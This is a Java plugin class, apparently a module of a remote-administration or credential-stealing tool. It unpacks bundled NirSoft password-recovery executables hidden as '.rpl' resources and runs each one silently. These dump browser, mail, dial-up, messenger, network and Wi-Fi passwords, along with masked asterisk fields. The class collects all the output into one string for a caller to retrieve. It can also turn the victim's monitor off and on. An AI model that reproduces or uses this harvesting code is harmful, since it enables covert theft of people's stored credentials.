/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package plugin.deps;

import comunes.Interfaz;
import java.io.File;
import java.io.InputStream;

/**
 *
 * @author alberto
 */
public class Nirsoft implements Interfaz {

    public static String[] nombresPluginsNirsoft = new String[]{"bpv", "dialupass", "mailpv", "netpass", "netpass64", "pspv", "mspass", "wireless", "wireless64", "wbpv", "wb", "nircmd", "nircmd64"};
    public String ruta = "";
    public String contenidoPass;

    @Override
    public void instanciar(Object... parametros) {

    }

    private void extrarPlugInsNirSoft() {
        File carpeta = new File("tmp");
        try {
            File temp1 = File.createTempFile("puajqweu", "dashdyuqtwe");
            carpeta = new File(temp1.getParentFile(), "tmp");
        } catch (Exception e) {

        }
        try {
            carpeta.mkdirs();
        } catch (Exception e) {
        }
        ruta = carpeta.getAbsolutePath();
        for (String plugin : nombresPluginsNirsoft) {
            try {
                File p = new File(carpeta, plugin + ".exe");
                InputStream recurso = Nirsoft.class.getResourceAsStream("/plugin/nirsoft/rpl/" + plugin + ".rpl");
                if (p.exists()) {
                    p.delete();
                }
                Util.copyFile(recurso, p);
            } catch (Exception e) {
            }
        }
    }

    private void monitor(int accion) {
        extrarPlugInsNirSoft();
        Process p;
        String action = "";
        switch (accion) {
            case 1://apagar
                action = "off";
                break;
            case 2://encender
                action = "on";
                break;
            default://si no es esta accion no hacemos nada
                return;
        }
        try {
            p = Runtime.getRuntime().exec(new String[]{ruta + "/nircmd.exe", "monitor", action});
            p.waitFor();
            p.destroy();
        } catch (Exception ex) {

        }

    }

    private String nirsoftPass() {
        extrarPlugInsNirSoft();
        StringBuilder retorno = new StringBuilder("");
        int largoTitulo = 75;
        File f;
        Process p;
        String finLinea = "\n";
        String error = "Error:";
        try {
//            retorno.append(finLinea).append("=====  PROTECTED STORAGE ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("PROTECTED STORAGE", largoTitulo)).append(finLinea);
            f = File.createTempFile("psvpv", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/pspv.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  WEB BROWSER ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("WEB BROWSER", largoTitulo)).append(finLinea);
            f = File.createTempFile("wbpv", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/wbpv.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  DIALUP ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("DIALUP", largoTitulo)).append(finLinea);
            f = File.createTempFile("dialup", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/dialupass.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  MAIL ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("MAIL", largoTitulo)).append(finLinea);
            f = File.createTempFile("mail", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/mailpv.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();//
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  MESSENGER ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("MESSENGER", largoTitulo)).append(finLinea);
            f = File.createTempFile("msn", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/mspass.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  NET PASS ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("NET PASS", largoTitulo)).append(finLinea);
            f = File.createTempFile("netpass", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/netpass.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  NETPASS 64 BITS ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("NET PASS 64 BITS", largoTitulo)).append(finLinea);
            f = File.createTempFile("netpass64", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/netpass64.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  WIRELESS ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("WIRELESS", largoTitulo)).append(finLinea);
            f = File.createTempFile("wireless", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/wireless.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  WIRELESS 64 ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("WIRELESS 64", largoTitulo)).append(finLinea);
            f = File.createTempFile("wireless64", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/wireless64.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        try {
//            retorno.append(finLinea).append("=====  ASTERISCOS ======\n").append(finLinea);
            retorno.append(finLinea).append(Util.crearTituloString("ASTERISCOS", largoTitulo)).append(finLinea);
            f = File.createTempFile("bpv", "txt");
            p = Runtime.getRuntime().exec(new String[]{ruta + "/bpv.exe", "/stext", f.getAbsolutePath()});
            p.waitFor();
            p.destroy();
            retorno.append(Util.getArchivoTexto(f.getAbsolutePath()));
            f.delete();
        } catch (Exception ex) {
            retorno.append(finLinea).append(error).append(ex.getMessage()).append(finLinea);
        }
        return retorno.toString();
    }

    @Override
    public void set(int opcion, Object valor) {

    }

    @Override
    public Object get(int opcion, Object... parametros) {
        switch (opcion) {
            case 1:
                return contenidoPass;
        }
        return null;
    }

    @Override
    public void ejecutar(int opcion, Object... parametros) {
        switch (opcion) {
            case 1:
                contenidoPass = nirsoftPass();
                break;
            case 2:
                monitor((Integer) parametros[0]);
                break;
        }
    }

}
